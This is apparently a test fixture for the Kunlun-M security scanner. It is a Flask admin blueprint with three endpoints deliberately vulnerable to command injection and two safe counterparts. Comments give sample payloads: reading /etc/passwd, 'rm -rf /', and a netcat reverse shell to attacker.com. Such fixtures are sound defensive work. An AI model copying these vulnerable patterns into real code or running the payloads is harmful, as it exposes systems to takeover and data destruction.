"""
Real-world command injection test cases for Kunlun-M scanner.
Simulates a Flask application with network diagnostic / system admin endpoints.
"""

import os
import shlex
import subprocess
from flask import Blueprint, request, jsonify

admin_bp = Blueprint('admin', __name__)


# ---------------------------------------------------------------------------
# VULN 1: os.system with user-controlled argument concatenation
# ---------------------------------------------------------------------------
@admin_bp.route('/api/admin/ping', methods=['GET'])
def ping_host():
    """Network diagnostic endpoint - allows admin to ping a host."""
    host = request.args.get('host', '127.0.0.1')
    # VULN: User input directly concatenated into shell command
    # Attacker can inject: host="127.0.0.1; cat /etc/passwd"
    os.system(f'ping -c 3 {host}')
    return jsonify({'status': 'done', 'host': host})


# ---------------------------------------------------------------------------
# VULN 2: subprocess.call with shell=True and user input
# ---------------------------------------------------------------------------
@admin_bp.route('/api/admin/dig', methods=['POST'])
def dns_lookup():
    """DNS lookup tool for administrators."""
    domain = request.form.get('domain', '')
    # VULN: subprocess.call with shell=True and string formatting
    # Attacker can inject: domain="google.com; rm -rf /"
    result = subprocess.call(f'dig {domain}', shell=True)
    return jsonify({'result': result, 'domain': domain})


# ---------------------------------------------------------------------------
# VULN 3: os.popen with user-controlled input
# ---------------------------------------------------------------------------
@admin_bp.route('/api/admin/whois', methods=['GET'])
def whois_lookup():
    """WHOIS lookup endpoint."""
    target = request.args.get('target', '')
    # VULN: os.popen with direct string interpolation
    # Attacker can inject: target="example.com | nc attacker.com 4444 -e /bin/bash"
    output = os.popen(f'whois {target}').read()
    return jsonify({'output': output})


# ---------------------------------------------------------------------------
# SAFE 1: shlex.quote properly sanitizes user input
# ---------------------------------------------------------------------------
@admin_bp.route('/api/admin/nslookup', methods=['GET'])
def nslookup():
    """DNS lookup using safe shlex quoting."""
    domain = request.args.get('domain', 'localhost')
    # SAFE: shlex.quote escapes shell metacharacters
    safe_domain = shlex.quote(domain)
    output = subprocess.check_output(
        f'nslookup {safe_domain}', shell=True, text=True
    )
    return jsonify({'output': output})


# ---------------------------------------------------------------------------
# SAFE 2: subprocess with list args (no shell=True)
# ---------------------------------------------------------------------------
@admin_bp.route('/api/admin/traceroute', methods=['POST'])
def traceroute():
    """Traceroute using safe argument list."""
    host = request.form.get('host', '')
    # SAFE: Passing args as list avoids shell injection entirely
    result = subprocess.run(['traceroute', '-w', '2', host], capture_output=True, text=True)
    return jsonify({'output': result.stdout, 'errors': result.stderr})
